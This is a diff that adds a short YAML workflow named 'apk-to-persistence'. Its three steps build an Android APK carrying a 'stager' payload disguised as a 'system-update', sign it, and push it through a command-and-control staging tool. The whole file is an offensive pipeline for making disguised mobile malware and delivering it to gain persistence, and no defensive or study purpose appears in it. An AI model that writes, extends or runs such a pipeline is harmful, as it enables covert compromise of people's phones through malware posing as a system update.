@@ -1,0 +1,14 @@
+name: apk-to-persistence
+entry: build
+nodes:
+  - id: build
+    tool: forge_apk
+    args: { payload: "stager", identity: "system-update" }
+  - id: sign
+    tool: forge_apk
+    needs: [build]
+    args: { sign: true }
+  - id: install
+    tool: c2_stage
+    needs: [sign]
+    args: { push: true }
